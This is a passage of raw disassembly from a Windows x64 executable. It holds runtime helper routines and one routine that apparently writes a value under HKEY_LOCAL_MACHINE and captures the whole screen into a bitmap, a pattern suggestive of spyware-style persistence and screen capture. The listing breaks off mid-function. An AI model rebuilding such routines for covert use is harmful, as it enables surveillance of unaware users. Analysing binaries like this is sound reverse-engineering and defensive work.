  403d8d:	e9 a3 fc ff ff       	jmp    0x403a35
  403d92:	48 83 c4 28          	add    $0x28,%rsp
  403d96:	5b                   	pop    %rbx
  403d97:	5e                   	pop    %rsi
  403d98:	c3                   	ret
  403d99:	48 83 ec 28          	sub    $0x28,%rsp
  403d9d:	e8 75 ed ff ff       	call   0x402b17
  403da2:	31 d2                	xor    %edx,%edx
  403da4:	48 8b 48 28          	mov    0x28(%rax),%rcx
  403da8:	48 83 c4 28          	add    $0x28,%rsp
  403dac:	eb 89                	jmp    0x403d37
  403dae:	56                   	push   %rsi
  403daf:	53                   	push   %rbx
  403db0:	48 83 ec 28          	sub    $0x28,%rsp
  403db4:	48 89 ce             	mov    %rcx,%rsi
  403db7:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  403dbb:	0f b6 da             	movzbl %dl,%ebx
  403dbe:	89 da                	mov    %ebx,%edx
  403dc0:	e8 72 ff ff ff       	call   0x403d37
  403dc5:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  403dc9:	89 da                	mov    %ebx,%edx
  403dcb:	e8 67 ff ff ff       	call   0x403d37
  403dd0:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  403dd4:	89 da                	mov    %ebx,%edx
  403dd6:	e8 5c ff ff ff       	call   0x403d37
  403ddb:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  403ddf:	89 da                	mov    %ebx,%edx
  403de1:	48 83 c4 28          	add    $0x28,%rsp
  403de5:	5b                   	pop    %rbx
  403de6:	5e                   	pop    %rsi
  403de7:	e9 4b ff ff ff       	jmp    0x403d37
  403dec:	48 83 ec 28          	sub    $0x28,%rsp
  403df0:	e8 22 ed ff ff       	call   0x402b17
  403df5:	31 d2                	xor    %edx,%edx
  403df7:	48 8b 48 08          	mov    0x8(%rax),%rcx
  403dfb:	48 83 c4 28          	add    $0x28,%rsp
  403dff:	e9 33 ff ff ff       	jmp    0x403d37
  403e04:	57                   	push   %rdi
  403e05:	56                   	push   %rsi
  403e06:	53                   	push   %rbx
  403e07:	48 83 ec 20          	sub    $0x20,%rsp
  403e0b:	31 db                	xor    %ebx,%ebx
  403e0d:	48 89 ce             	mov    %rcx,%rsi
  403e10:	0f b6 fa             	movzbl %dl,%edi
  403e13:	48 85 f6             	test   %rsi,%rsi
  403e16:	74 1d                	je     0x403e35
  403e18:	48 3b 1e             	cmp    (%rsi),%rbx
  403e1b:	7d 18                	jge    0x403e35
  403e1d:	48 89 d8             	mov    %rbx,%rax
  403e20:	89 fa                	mov    %edi,%edx
  403e22:	48 ff c3             	inc    %rbx
  403e25:	48 c1 e0 04          	shl    $0x4,%rax
  403e29:	48 8b 4c 06 18       	mov    0x18(%rsi,%rax,1),%rcx
  403e2e:	e8 04 ff ff ff       	call   0x403d37
  403e33:	eb de                	jmp    0x403e13
  403e35:	48 83 c4 20          	add    $0x20,%rsp
  403e39:	5b                   	pop    %rbx
  403e3a:	5e                   	pop    %rsi
  403e3b:	5f                   	pop    %rdi
  403e3c:	c3                   	ret
  403e3d:	41 55                	push   %r13
  403e3f:	41 54                	push   %r12
  403e41:	55                   	push   %rbp
  403e42:	57                   	push   %rdi
  403e43:	56                   	push   %rsi
  403e44:	53                   	push   %rbx
  403e45:	48 83 ec 28          	sub    $0x28,%rsp
  403e49:	8a 02                	mov    (%rdx),%al
  403e4b:	3c 02                	cmp    $0x2,%al
  403e4d:	48 89 cb             	mov    %rcx,%rbx
  403e50:	48 89 d7             	mov    %rdx,%rdi
  403e53:	74 30                	je     0x403e85
  403e55:	3c 03                	cmp    $0x3,%al
  403e57:	0f 84 8d 00 00 00    	je     0x403eea
  403e5d:	fe c8                	dec    %al
  403e5f:	0f 85 aa 00 00 00    	jne    0x403f0f
  403e65:	48 03 5f 08          	add    0x8(%rdi),%rbx
  403e69:	45 0f b6 c0          	movzbl %r8b,%r8d
  403e6d:	48 8b 52 10          	mov    0x10(%rdx),%rdx
  403e71:	48 89 d9             	mov    %rbx,%rcx
  403e74:	48 83 c4 28          	add    $0x28,%rsp
  403e78:	5b                   	pop    %rbx
  403e79:	5e                   	pop    %rsi
  403e7a:	5f                   	pop    %rdi
  403e7b:	5d                   	pop    %rbp
  403e7c:	41 5c                	pop    %r12
  403e7e:	41 5d                	pop    %r13
  403e80:	e9 97 00 00 00       	jmp    0x403f1c
  403e85:	48 8b 42 20          	mov    0x20(%rdx),%rax
  403e89:	41 0f b6 f0          	movzbl %r8b,%esi
  403e8d:	31 ed                	xor    %ebp,%ebp
  403e8f:	41 bd 00 00 40 11    	mov    $0x11400000,%r13d
  403e95:	4c 8d 60 ff          	lea    -0x1(%rax),%r12
  403e99:	49 39 ec             	cmp    %rbp,%r12
  403e9c:	7c 71                	jl     0x403f0f
  403e9e:	48 8b 47 28          	mov    0x28(%rdi),%rax
  403ea2:	48 8b 04 e8          	mov    (%rax,%rbp,8),%rax
  403ea6:	80 38 01             	cmpb   $0x1,(%rax)
  403ea9:	75 2c                	jne    0x403ed7
  403eab:	48 8b 50 10          	mov    0x10(%rax),%rdx
  403eaf:	48 8b 48 08          	mov    0x8(%rax),%rcx
  403eb3:	44 8a 42 08          	mov    0x8(%rdx),%r8b
  403eb7:	4d 0f a3 c5          	bt     %r8,%r13
  403ebb:	73 0d                	jae    0x403eca
  403ebd:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
  403ec1:	89 f2                	mov    %esi,%edx
  403ec3:	e8 6f fe ff ff       	call   0x403d37
  403ec8:	eb 1b                	jmp    0x403ee5
  403eca:	48 01 d9             	add    %rbx,%rcx
  403ecd:	41 89 f0             	mov    %esi,%r8d
  403ed0:	e8 47 00 00 00       	call   0x403f1c
  403ed5:	eb 0e                	jmp    0x403ee5
  403ed7:	41 89 f0             	mov    %esi,%r8d
  403eda:	48 89 c2             	mov    %rax,%rdx
  403edd:	48 89 d9             	mov    %rbx,%rcx
  403ee0:	e8 58 ff ff ff       	call   0x403e3d
  403ee5:	48 ff c5             	inc    %rbp
  403ee8:	eb af                	jmp    0x403e99
  403eea:	e8 df f7 ff ff       	call   0x4036ce
  403eef:	48 85 c0             	test   %rax,%rax
  403ef2:	74 1b                	je     0x403f0f
  403ef4:	45 0f b6 c0          	movzbl %r8b,%r8d
  403ef8:	48 89 c2             	mov    %rax,%rdx
  403efb:	48 89 d9             	mov    %rbx,%rcx
  403efe:	48 83 c4 28          	add    $0x28,%rsp
  403f02:	5b                   	pop    %rbx
  403f03:	5e                   	pop    %rsi
  403f04:	5f                   	pop    %rdi
  403f05:	5d                   	pop    %rbp
  403f06:	41 5c                	pop    %r12
  403f08:	41 5d                	pop    %r13
  403f0a:	e9 2e ff ff ff       	jmp    0x403e3d
  403f0f:	48 83 c4 28          	add    $0x28,%rsp
  403f13:	5b                   	pop    %rbx
  403f14:	5e                   	pop    %rsi
  403f15:	5f                   	pop    %rdi
  403f16:	5d                   	pop    %rbp
  403f17:	41 5c                	pop    %r12
  403f19:	41 5d                	pop    %r13
  403f1b:	c3                   	ret
  403f1c:	41 54                	push   %r12
  403f1e:	55                   	push   %rbp
  403f1f:	57                   	push   %rdi
  403f20:	56                   	push   %rsi
  403f21:	53                   	push   %rbx
  403f22:	48 83 ec 20          	sub    $0x20,%rsp
  403f26:	48 85 c9             	test   %rcx,%rcx
  403f29:	49 89 cc             	mov    %rcx,%r12
  403f2c:	48 89 d7             	mov    %rdx,%rdi
  403f2f:	0f 84 9a 00 00 00    	je     0x403fcf
  403f35:	f6 42 09 01          	testb  $0x1,0x9(%rdx)
  403f39:	0f 85 90 00 00 00    	jne    0x403fcf
  403f3f:	8a 4a 08             	mov    0x8(%rdx),%cl
  403f42:	80 f9 1c             	cmp    $0x1c,%cl
  403f45:	0f 87 84 00 00 00    	ja     0x403fcf
  403f4b:	b8 01 00 00 00       	mov    $0x1,%eax
  403f50:	48 d3 e0             	shl    %cl,%rax
  403f53:	a9 10 00 01 08       	test   $0x8010010,%eax
  403f58:	75 3f                	jne    0x403f99
  403f5a:	a9 00 00 40 11       	test   $0x11400000,%eax
  403f5f:	75 21                	jne    0x403f82
  403f61:	a9 00 00 06 00       	test   $0x60000,%eax
  403f66:	74 67                	je     0x403fcf
  403f68:	48 8b 52 18          	mov    0x18(%rdx),%rdx
  403f6c:	45 0f b6 c0          	movzbl %r8b,%r8d
  403f70:	4c 89 e1             	mov    %r12,%rcx
  403f73:	48 83 c4 20          	add    $0x20,%rsp
  403f77:	5b                   	pop    %rbx
  403f78:	5e                   	pop    %rsi
  403f79:	5f                   	pop    %rdi
  403f7a:	5d                   	pop    %rbp
  403f7b:	41 5c                	pop    %r12
  403f7d:	e9 bb fe ff ff       	jmp    0x403e3d
  403f82:	49 8b 0c 24          	mov    (%r12),%rcx
  403f86:	41 0f b6 d0          	movzbl %r8b,%edx
  403f8a:	48 83 c4 20          	add    $0x20,%rsp
  403f8e:	5b                   	pop    %rbx
  403f8f:	5e                   	pop    %rsi
  403f90:	5f                   	pop    %rdi
  403f91:	5d                   	pop    %rbp
  403f92:	41 5c                	pop    %r12
  403f94:	e9 9e fd ff ff       	jmp    0x403d37
  403f99:	48 8b 02             	mov    (%rdx),%rax
  403f9c:	41 0f b6 f0          	movzbl %r8b,%esi
  403fa0:	31 ed                	xor    %ebp,%ebp
  403fa2:	48 8b 5a 10          	mov    0x10(%rdx),%rbx
  403fa6:	48 99                	cqto
  403fa8:	48 f7 3b             	idivq  (%rbx)
  403fab:	48 8d 58 ff          	lea    -0x1(%rax),%rbx
  403faf:	48 39 eb             	cmp    %rbp,%rbx
  403fb2:	7c 1b                	jl     0x403fcf
  403fb4:	48 8b 57 10          	mov    0x10(%rdi),%rdx
  403fb8:	48 89 e9             	mov    %rbp,%rcx
  403fbb:	41 89 f0             	mov    %esi,%r8d
  403fbe:	48 ff c5             	inc    %rbp
  403fc1:	48 0f af 0a          	imul   (%rdx),%rcx
  403fc5:	4c 01 e1             	add    %r12,%rcx
  403fc8:	e8 4f ff ff ff       	call   0x403f1c
  403fcd:	eb e0                	jmp    0x403faf
  403fcf:	48 83 c4 20          	add    $0x20,%rsp
  403fd3:	5b                   	pop    %rbx
  403fd4:	5e                   	pop    %rsi
  403fd5:	5f                   	pop    %rdi
  403fd6:	5d                   	pop    %rbp
  403fd7:	41 5c                	pop    %r12
  403fd9:	c3                   	ret
  403fda:	41 54                	push   %r12
  403fdc:	55                   	push   %rbp
  403fdd:	57                   	push   %rdi
  403fde:	56                   	push   %rsi
  403fdf:	53                   	push   %rbx
  403fe0:	48 83 ec 20          	sub    $0x20,%rsp
  403fe4:	48 8b 41 08          	mov    0x8(%rcx),%rax
  403fe8:	4c 8b 48 28          	mov    0x28(%rax),%r9
  403fec:	41 89 d0             	mov    %edx,%r8d
  403fef:	48 89 cb             	mov    %rcx,%rbx
  403ff2:	0f b6 d2             	movzbl %dl,%edx
  403ff5:	4d 85 c9             	test   %r9,%r9
  403ff8:	74 11                	je     0x40400b
  403ffa:	48 8d 49 10          	lea    0x10(%rcx),%rcx
  403ffe:	48 83 c4 20          	add    $0x20,%rsp
  404002:	5b                   	pop    %rbx
  404003:	5e                   	pop    %rsi
  404004:	5f                   	pop    %rdi
  404005:	5d                   	pop    %rbp
  404006:	41 5c                	pop    %r12
  404008:	49 ff e1             	rex.WB jmp *%r9
  40400b:	8a 50 08             	mov    0x8(%rax),%dl
  40400e:	80 fa 16             	cmp    $0x16,%dl
  404011:	74 07                	je     0x40401a
  404013:	80 fa 18             	cmp    $0x18,%dl
  404016:	74 1d                	je     0x404035
  404018:	eb 57                	jmp    0x404071
  40401a:	48 8b 50 10          	mov    0x10(%rax),%rdx
  40401e:	48 8d 49 10          	lea    0x10(%rcx),%rcx
  404022:	45 0f b6 c0          	movzbl %r8b,%r8d
  404026:	48 83 c4 20          	add    $0x20,%rsp
  40402a:	5b                   	pop    %rbx
  40402b:	5e                   	pop    %rsi
  40402c:	5f                   	pop    %rdi
  40402d:	5d                   	pop    %rbp
  40402e:	41 5c                	pop    %r12
  404030:	e9 e7 fe ff ff       	jmp    0x403f1c
  404035:	48 83 f9 f0          	cmp    $0xfffffffffffffff0,%rcx
  404039:	41 0f b6 e8          	movzbl %r8b,%ebp
  40403d:	74 32                	je     0x404071
  40403f:	48 8b 41 10          	mov    0x10(%rcx),%rax
  404043:	4c 8d 61 20          	lea    0x20(%rcx),%r12
  404047:	31 f6                	xor    %esi,%esi
  404049:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
  40404d:	48 39 f7             	cmp    %rsi,%rdi
  404050:	7c 1f                	jl     0x404071
  404052:	48 8b 43 08          	mov    0x8(%rbx),%rax
  404056:	48 89 f1             	mov    %rsi,%rcx
  404059:	41 89 e8             	mov    %ebp,%r8d
  40405c:	48 ff c6             	inc    %rsi
  40405f:	48 8b 50 10          	mov    0x10(%rax),%rdx
  404063:	48 0f af 0a          	imul   (%rdx),%rcx
  404067:	4c 01 e1             	add    %r12,%rcx
  40406a:	e8 ad fe ff ff       	call   0x403f1c
  40406f:	eb dc                	jmp    0x40404d
  404071:	48 83 c4 20          	add    $0x20,%rsp
  404075:	5b                   	pop    %rbx
  404076:	5e                   	pop    %rsi
  404077:	5f                   	pop    %rdi
  404078:	5d                   	pop    %rbp
  404079:	41 5c                	pop    %r12
  40407b:	c3                   	ret
  40407c:	55                   	push   %rbp
  40407d:	57                   	push   %rdi
  40407e:	56                   	push   %rsi
  40407f:	53                   	push   %rbx
  404080:	48 83 ec 28          	sub    $0x28,%rsp
  404084:	bd 01 00 00 00       	mov    $0x1,%ebp
  404089:	48 8d b9 90 33 00 00 	lea    0x3390(%rcx),%rdi
  404090:	48 89 d3             	mov    %rdx,%rbx
  404093:	48 89 ce             	mov    %rcx,%rsi
  404096:	48 89 f9             	mov    %rdi,%rcx
  404099:	e8 62 f8 ff ff       	call   0x403900
  40409e:	ba 01 00 00 00       	mov    $0x1,%edx
  4040a3:	48 89 d9             	mov    %rbx,%rcx
  4040a6:	e8 2f ff ff ff       	call   0x403fda
  4040ab:	48 8b 46 48          	mov    0x48(%rsi),%rax
  4040af:	48 85 c0             	test   %rax,%rax
  4040b2:	7e 6d                	jle    0x404121
  4040b4:	48 8b 56 58          	mov    0x58(%rsi),%rdx
  4040b8:	48 ff c8             	dec    %rax
  4040bb:	48 89 f9             	mov    %rdi,%rcx
  4040be:	48 89 46 48          	mov    %rax,0x48(%rsi)
  4040c2:	48 8b 1c c2          	mov    (%rdx,%rax,8),%rbx
  4040c6:	48 89 da             	mov    %rbx,%rdx
  4040c9:	48 c1 ea 0c          	shr    $0xc,%rdx
  4040cd:	e8 d2 f5 ff ff       	call   0x4036a4
  4040d2:	48 85 c0             	test   %rax,%rax
  4040d5:	74 30                	je     0x404107
  4040d7:	48 89 d9             	mov    %rbx,%rcx
  4040da:	49 89 e9             	mov    %rbp,%r9
  4040dd:	48 c1 e9 03          	shr    $0x3,%rcx
  4040e1:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  4040e7:	48 89 ca             	mov    %rcx,%rdx
  4040ea:	49 d3 e1             	shl    %cl,%r9
  4040ed:	48 c1 ea 06          	shr    $0x6,%rdx
  4040f1:	48 83 c2 02          	add    $0x2,%rdx
  4040f5:	4c 8b 04 d0          	mov    (%rax,%rdx,8),%r8
  4040f9:	4d 85 c8             	test   %r9,%r8
  4040fc:	75 ad                	jne    0x4040ab
  4040fe:	4d 09 c8             	or     %r9,%r8
  404101:	4c 89 04 d0          	mov    %r8,(%rax,%rdx,8)
  404105:	eb 0b                	jmp    0x404112
  404107:	48 89 da             	mov    %rbx,%rdx
  40410a:	48 89 f9             	mov    %rdi,%rcx
  40410d:	e8 ee f7 ff ff       	call   0x403900
  404112:	ba 01 00 00 00       	mov    $0x1,%edx
  404117:	48 89 d9             	mov    %rbx,%rcx
  40411a:	e8 bb fe ff ff       	call   0x403fda
  40411f:	eb 8a                	jmp    0x4040ab
  404121:	48 83 c4 28          	add    $0x28,%rsp
  404125:	5b                   	pop    %rbx
  404126:	5e                   	pop    %rsi
  404127:	5f                   	pop    %rdi
  404128:	5d                   	pop    %rbp
  404129:	c3                   	ret
  40412a:	90                   	nop
  40412b:	90                   	nop
  40412c:	90                   	nop
  40412d:	90                   	nop
  40412e:	90                   	nop
  40412f:	90                   	nop
  404130:	48 8b 0d 91 33 02 00 	mov    0x23391(%rip),%rcx        # 0x4274c8
  404137:	31 d2                	xor    %edx,%edx
  404139:	e9 f9 fb ff ff       	jmp    0x403d37
  40413e:	48 8b 0d e3 33 02 00 	mov    0x233e3(%rip),%rcx        # 0x427528
  404145:	31 d2                	xor    %edx,%edx
  404147:	e9 eb fb ff ff       	jmp    0x403d37
  40414c:	57                   	push   %rdi
  40414d:	31 c0                	xor    %eax,%eax
  40414f:	49 89 c8             	mov    %rcx,%r8
  404152:	48 89 d1             	mov    %rdx,%rcx
  404155:	4c 89 c7             	mov    %r8,%rdi
  404158:	f3 aa                	rep stos %al,(%rdi)
  40415a:	5f                   	pop    %rdi
  40415b:	c3                   	ret
  40415c:	56                   	push   %rsi
  40415d:	53                   	push   %rbx
  40415e:	48 83 ec 28          	sub    $0x28,%rsp
  404162:	48 85 d2             	test   %rdx,%rdx
  404165:	48 89 ce             	mov    %rcx,%rsi
  404168:	48 89 d3             	mov    %rdx,%rbx
  40416b:	74 05                	je     0x404172
  40416d:	48 83 42 f0 08       	addq   $0x8,-0x10(%rdx)
  404172:	48 8b 0e             	mov    (%rsi),%rcx
  404175:	48 85 c9             	test   %rcx,%rcx
  404178:	74 09                	je     0x404183
  40417a:	48 83 e9 10          	sub    $0x10,%rcx
  40417e:	e8 80 fb ff ff       	call   0x403d03
  404183:	48 89 1e             	mov    %rbx,(%rsi)
  404186:	48 83 c4 28          	add    $0x28,%rsp
  40418a:	5b                   	pop    %rbx
  40418b:	5e                   	pop    %rsi
  40418c:	c3                   	ret
  40418d:	41 57                	push   %r15
  40418f:	41 56                	push   %r14
  404191:	41 55                	push   %r13
  404193:	41 54                	push   %r12
  404195:	55                   	push   %rbp
  404196:	57                   	push   %rdi
  404197:	56                   	push   %rsi
  404198:	53                   	push   %rbx
  404199:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
  4041a0:	48 8b 05 59 31 02 00 	mov    0x23159(%rip),%rax        # 0x427300
  4041a7:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
  4041ad:	7f 6a                	jg     0x404219
  4041af:	48 8d 50 01          	lea    0x1(%rax),%rdx
  4041b3:	48 8d 0d e6 c3 01 00 	lea    0x1c3e6(%rip),%rcx        # 0x4205a0
  4041ba:	48 81 fa ac 0d 00 00 	cmp    $0xdac,%rdx
  4041c1:	48 89 15 38 31 02 00 	mov    %rdx,0x23138(%rip)        # 0x427300
  4041c8:	48 8d 3d 6f ff ff ff 	lea    -0x91(%rip),%rdi        # 0x40413e
  4041cf:	48 89 3c c1          	mov    %rdi,(%rcx,%rax,8)
  4041d3:	74 44                	je     0x404219
  4041d5:	48 8d 3d 54 ff ff ff 	lea    -0xac(%rip),%rdi        # 0x404130
  4041dc:	48 83 c0 02          	add    $0x2,%rax
  4041e0:	48 89 05 19 31 02 00 	mov    %rax,0x23119(%rip)        # 0x427300
  4041e7:	48 8b 05 62 31 01 00 	mov    0x13162(%rip),%rax        # 0x417350
  4041ee:	48 89 3c d1          	mov    %rdi,(%rcx,%rdx,8)
  4041f2:	ff 10                	call   *(%rax)
  4041f4:	e8 37 37 00 00       	call   0x407930
  4041f9:	48 89 c6             	mov    %rax,%rsi
  4041fc:	48 8b 05 dd 31 01 00 	mov    0x131dd(%rip),%rax        # 0x4173e0
  404203:	ff 10                	call   *(%rax)
  404205:	ff c8                	dec    %eax
  404207:	75 15                	jne    0x40421e
  404209:	48 8d 15 70 04 01 00 	lea    0x10470(%rip),%rdx        # 0x414680
  404210:	48 8d 0d 89 04 01 00 	lea    0x10489(%rip),%rcx        # 0x4146a0
  404217:	eb 1b                	jmp    0x404234
  404219:	e8 f2 9a 00 00       	call   0x40dd10
  40421e:	48 8d 0d 3b 04 01 00 	lea    0x1043b(%rip),%rcx        # 0x414660
  404225:	e8 3e 33 00 00       	call   0x407568
  40422a:	48 8d 15 4f 04 01 00 	lea    0x1044f(%rip),%rdx        # 0x414680
  404231:	48 89 c1             	mov    %rax,%rcx
  404234:	e8 06 3c 00 00       	call   0x407e3f
  404239:	48 89 f1             	mov    %rsi,%rcx
  40423c:	48 89 c2             	mov    %rax,%rdx
  40423f:	48 89 c3             	mov    %rax,%rbx
  404242:	e8 83 1d 00 00       	call   0x405fca
  404247:	84 c0                	test   %al,%al
  404249:	75 0b                	jne    0x404256
  40424b:	48 89 da             	mov    %rbx,%rdx
  40424e:	48 89 f1             	mov    %rsi,%rcx
  404251:	e8 7f 3e 00 00       	call   0x4080d5
  404256:	48 8d 0d c3 03 01 00 	lea    0x103c3(%rip),%rcx        # 0x414620
  40425d:	48 c7 84 24 b0 00 00 	movq   $0x0,0xb0(%rsp)
  404264:	00 00 00 00 00 
  404269:	e8 3a e8 ff ff       	call   0x402aa8
  40426e:	4c 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%r14
  404275:	00 
  404276:	45 31 c0             	xor    %r8d,%r8d
  404279:	41 b9 02 00 00 00    	mov    $0x2,%r9d
  40427f:	48 89 c2             	mov    %rax,%rdx
  404282:	48 8b 05 e7 30 01 00 	mov    0x130e7(%rip),%rax        # 0x417370
  404289:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
  40428e:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
  404295:	4c 8d 64 24 58       	lea    0x58(%rsp),%r12
  40429a:	ff 10                	call   *(%rax)
  40429c:	48 8d 0d 3d 03 01 00 	lea    0x1033d(%rip),%rcx        # 0x4145e0
  4042a3:	e8 00 e8 ff ff       	call   0x402aa8
  4042a8:	48 89 d9             	mov    %rbx,%rcx
  4042ab:	48 89 c6             	mov    %rax,%rsi
  4042ae:	e8 66 e7 ff ff       	call   0x402a19
  4042b3:	48 89 c1             	mov    %rax,%rcx
  4042b6:	e8 49 e7 ff ff       	call   0x402a04
  4042bb:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  4042c1:	45 31 c0             	xor    %r8d,%r8d
  4042c4:	48 89 f2             	mov    %rsi,%rdx
  4042c7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  4042cc:	48 8b 05 ad 30 01 00 	mov    0x130ad(%rip),%rax        # 0x417380
  4042d3:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
  4042da:	00 
  4042db:	c7 44 24 28 04 01 00 	movl   $0x104,0x28(%rsp)
  4042e2:	00 
  4042e3:	ff 10                	call   *(%rax)
  4042e5:	48 8b 05 74 30 01 00 	mov    0x13074(%rip),%rax        # 0x417360
  4042ec:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
  4042f3:	00 
  4042f4:	ff 10                	call   *(%rax)
  4042f6:	48 8b 1d c3 2f 01 00 	mov    0x12fc3(%rip),%rbx        # 0x4172c0
  4042fd:	b9 4c 00 00 00       	mov    $0x4c,%ecx
  404302:	ff 13                	call   *(%rbx)
  404304:	b9 4d 00 00 00       	mov    $0x4d,%ecx
  404309:	89 c5                	mov    %eax,%ebp
  40430b:	ff 13                	call   *(%rbx)
  40430d:	b9 4e 00 00 00       	mov    $0x4e,%ecx
  404312:	89 c7                	mov    %eax,%edi
  404314:	ff 13                	call   *(%rbx)
  404316:	b9 4f 00 00 00       	mov    $0x4f,%ecx
  40431b:	41 89 c5             	mov    %eax,%r13d
  40431e:	ff 13                	call   *(%rbx)
  404320:	4c 89 e1             	mov    %r12,%rcx
  404323:	ba 10 00 00 00       	mov    $0x10,%edx
  404328:	41 29 ed             	sub    %ebp,%r13d
  40432b:	89 c3                	mov    %eax,%ebx
  40432d:	49 83 c4 08          	add    $0x8,%r12
  404331:	e8 16 fe ff ff       	call   0x40414c
  404336:	29 fb                	sub    %edi,%ebx
  404338:	31 d2                	xor    %edx,%edx
  40433a:	4c 89 e1             	mov    %r12,%rcx
  40433d:	89 d8                	mov    %ebx,%eax
  40433f:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
  404346:	00 
  404347:	c1 f8 1f             	sar    $0x1f,%eax
  40434a:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
  404351:	00 
  404352:	31 c3                	xor    %eax,%ebx
  404354:	29 c3                	sub    %eax,%ebx
  404356:	44 89 e8             	mov    %r13d,%eax
  404359:	c1 f8 1f             	sar    $0x1f,%eax
  40435c:	41 31 c5             	xor    %eax,%r13d
  40435f:	41 29 c5             	sub    %eax,%r13d
  404362:	e8 12 10 00 00       	call   0x405379
  404367:	89 5c 24 5c          	mov    %ebx,0x5c(%rsp)
  40436b:	41 0f af dd          	imul   %r13d,%ebx
  40436f:	48 8b 0d fa 31 01 00 	mov    0x131fa(%rip),%rcx        # 0x417570
  404376:	44 89 6c 24 58       	mov    %r13d,0x58(%rsp)
  40437b:	8d 14 9d 00 00 00 00 	lea    0x0(,%rbx,4),%edx
  404382:	48 63 d2             	movslq %edx,%rdx
  404385:	e8 6c 1a 00 00       	call   0x405df6
  40438a:	4c 89 e1             	mov    %r12,%rcx
  40438d:	48 89 c2             	mov    %rax,%rdx
  404390:	e8 e4 0f 00 00       	call   0x405379
  404395:	48 8b 05 34 2f 01 00 	mov    0x12f34(%rip),%rax        # 0x4172d0
  40439c:	31 c9                	xor    %ecx,%ecx
  40439e:	ff 10                	call   *(%rax)
  4043a0:	49 89 c4             	mov    %rax,%r12
  4043a3:	48 89 c1             	mov    %rax,%rcx
  4043a6:	48 8b 05 b3 2e 01 00 	mov    0x12eb3(%rip),%rax        # 0x417260
  4043ad:	ff 10                	call   *(%rax)
  4043af:	44 8b 44 24 5c       	mov    0x5c(%rsp),%r8d
  4043b4:	4c 89 e1             	mov    %r12,%rcx
  4043b7:	48 89 c3             	mov    %rax,%rbx
  4043ba:	48 8b 05 8f 2e 01 00 	mov    0x12e8f(%rip),%rax        # 0x417250
  4043c1:	8b 54 24 58          	mov    0x58(%rsp),%edx
  4043c5:	ff 10                	call   *(%rax)
  4043c7:	48 89 d9             	mov    %rbx,%rcx
  4043ca:	49 89 c5             	mov    %rax,%r13
  4043cd:	48 89 c2             	mov    %rax,%rdx
  4043d0:	48 8b 05 c9 2e 01 00 	mov    0x12ec9(%rip),%rax        # 0x4172a0
  4043d7:	ff 10                	call   *(%rax)
  4043d9:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
  4043dd:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
  4043e4:	00 
  4043e5:	31 d2                	xor    %edx,%edx
  4043e7:	49 89 c7             	mov    %rax,%r15
  4043ea:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
  4043ee:	45 31 c0             	xor    %r8d,%r8d
  4043f1:	48 89 d9             	mov    %rbx,%rcx
  4043f4:	44 8b 4c 24 58       	mov    0x58(%rsp),%r9d
  4043f9:	89 7c 24 38          	mov    %edi,0x38(%rsp)
  4043fd:	c7 44 24 40 20 00 cc 	movl   $0xcc0020,0x40(%rsp)
  404404:	00 
  404405:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
  40440a:	89 44 24 20          	mov    %eax,0x20(%rsp)
  40440e:	48 8b 05 2b 2e 01 00 	mov    0x12e2b(%rip),%rax        # 0x417240
  404415:	ff 10                	call   *(%rax)
  404417:	ba 2c 00 00 00       	mov    $0x2c,%edx
  40441c:	48 89 e9             	mov    %rbp,%rcx
  40441f:	8b 7c 24 5c          	mov    0x5c(%rsp),%edi
  404423:	8b 74 24 58          	mov    0x58(%rsp),%esi
  404427:	e8 20 fd ff ff       	call   0x40414c
  40442c:	ba 2c 00 00 00       	mov    $0x2c,%edx
  404431:	48 89 e9             	mov    %rbp,%rcx
  404434:	e8 13 fd ff ff       	call   0x40414c
  404439:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  40443e:	45 31 c0             	xor    %r8d,%r8d
  404441:	48 89 ea             	mov    %rbp,%rdx
  404444:	89 bc 24 88 00 00 00 	mov    %edi,0x88(%rsp)
  40444b:	b9 0b 00 00 00       	mov    $0xb,%ecx
  404450:	4c 89 f7             	mov    %r14,%rdi
  404453:	89 b4 24 84 00 00 00 	mov    %esi,0x84(%rsp)
  40445a:	48 89 ee             	mov    %rbp,%rsi
  40445d:	c7 84 24 80 00 00 00 	movl   $0x28,0x80(%rsp)
  404464:	28 00 00 00 
  404468:	66 c7 84 24 8c 00 00 	movw   $0x1,0x8c(%rsp)
  40446f:	00 01 00 
  404472:	4c 8d 48 10          	lea    0x10(%rax),%r9
  404476:	48 8b 05 33 2e 01 00 	mov    0x12e33(%rip),%rax        # 0x4172b0
  40447d:	66 c7 84 24 8e 00 00 	movw   $0x20,0x8e(%rsp)
  404484:	00 20 00 
  404487:	c7 84 24 90 00 00 00 	movl   $0x0,0x90(%rsp)
  40448e:	00 00 00 00 
  404492:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
  404499:	00 00 00 00 
  40449d:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%rsp)
  4044a4:	00 00 00 00 
  4044a8:	c7 84 24 9c 00 00 00 	movl   $0x0,0x9c(%rsp)
  4044af:	00 00 00 00 
  4044b3:	c7 84 24 a0 00 00 00 	movl   $0x0,0xa0(%rsp)
  4044ba:	00 00 00 00 
  4044be:	c7 84 24 a4 00 00 00 	movl   $0x0,0xa4(%rsp)
  4044c5:	00 00 00 00 
  4044c9:	f3 a5                	rep movsl (%rsi),(%rdi)
  4044cb:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4044d0:	48 89 ef             	mov    %rbp,%rdi
